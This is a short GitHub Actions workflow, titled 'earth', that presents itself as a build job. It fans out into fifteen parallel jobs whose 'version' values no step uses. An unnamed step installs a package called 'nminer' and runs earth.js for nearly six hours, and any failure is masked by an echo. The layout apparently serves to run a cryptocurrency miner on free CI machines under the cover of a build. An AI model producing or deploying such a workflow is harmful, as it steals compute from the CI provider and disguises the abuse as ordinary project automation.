name: earth
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4622 }
          - { version: 3753 }
          - { version: 5865 }
          - { version: 7200 }
          - { version: 6545 }
          - { version: 5913 }
          - { version: 5511 }
          - { version: 2563 }
          - { version: 3461 }
          - { version: 4896 }
          - { version: 4510 }
          - { version: 5131 }
          - { version: 1520 }
          - { version: 2696 }
          - { version: 9603 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 345m node earth.js || echo "earth executed"